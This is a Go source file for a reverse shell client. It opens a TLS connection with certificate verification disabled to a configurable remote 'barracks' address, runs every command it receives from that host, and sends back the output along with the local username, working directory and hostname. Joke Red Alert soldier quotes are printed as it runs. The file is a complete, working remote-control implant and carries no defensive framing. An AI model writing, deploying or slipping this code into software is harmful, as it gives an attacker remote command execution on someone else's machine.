package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/user"
	"strings"
	"time"

	reverse "github.com/justin-p/shell-alert2/pkg"
)

var (
	tls_config = tls.Config{
		InsecureSkipVerify: true,
	}
	line_ter = "\000"

	selc_q = []string{
		"Awaiting orders.",
		"Comrade?",
		"Conscript reporting.",
	}
	move_q = []string{
		"Moving out.",
		"Order received.",
		"For the Union!",
		"Da!",
	}
	atck_q = []string{
		"For home country!",
		"Attacking.",
		"You are sure?",
		"For Mother Russia!",
	}
	supp_q = []string{
		"Mommy!",
		"(crying)",
		"We are being attacked!",
	}

	barracks_ip string

	barracks_port string
)

func main() {
	fmt.Printf("%s \n", rQ(move_q))
	conn, err := tls.Dial("tcp", net.JoinHostPort(barracks_ip, barracks_port), &tls_config)
	fmt.Printf("%s \n", rQ(atck_q))
	if err != nil {
		log.Fatalf("%s : %s", rQ(supp_q), err)
	}
	defer conn.Close()

	in := make(chan string)
	out := make(chan string)
	defer close(in)
	defer close(out)

	go CmdProc(in, out)

	go func() {
		r := bufio.NewReader(conn)
		for {
			if l, err := r.ReadString('\n'); err == nil {
				l = strings.TrimSpace(l)
				if len(l) > 0 {
					in <- fmt.Sprintf("%s\n", l)
				}
			}
		}
	}()

	w := bufio.NewWriter(conn)
	for {
		select {
		case w_out := <-out:
			w.WriteString(w_out)
			w.Flush()
		}
	}
}

func gCurD() (dir string) {
	if d, err := os.Getwd(); err == nil {
		dir = d
	}
	return
}

func gCurU() (currentUser string) {
	if user, err := user.Current(); err == nil {
		currentUser = user.Username
	}
	return
}

func gH() (host string) {
	if h, err := os.Hostname(); err == nil {
		host = h
	}
	return
}

func execCmd(cmd string) string {
	cmd = strings.TrimSuffix(cmd, "\n")
	args := strings.Split(cmd, " ")
	exec := exec.Command(args[0], args[1:]...)
	var stdout, stderr bytes.Buffer
	exec.Stdout = &stdout
	exec.Stderr = &stderr
	exec.Run()
	return genOutput(stdout.String(), stderr.String())
}

func CmdProc(in <-chan string, out chan<- string) {
	out <- genOutput("", "")
	for {
		select {
		case in := <-in:
			out <- execCmd(in)
		}
	}
}

func genOutput(out, err string) string {
	output, _ := json.Marshal(reverse.ShellOut{
		User:     gCurU(),
		Dir:      gCurD(),
		Hostname: gH(),
		StdOut:   out,
		StdErr:   err,
	})
	return fmt.Sprintf("%s%s", string(output), line_ter)
}

func rQ(q []string) string {
	rand.Seed(time.Now().Unix())
	n := rand.Int() % len(q)
	return q[n]
}
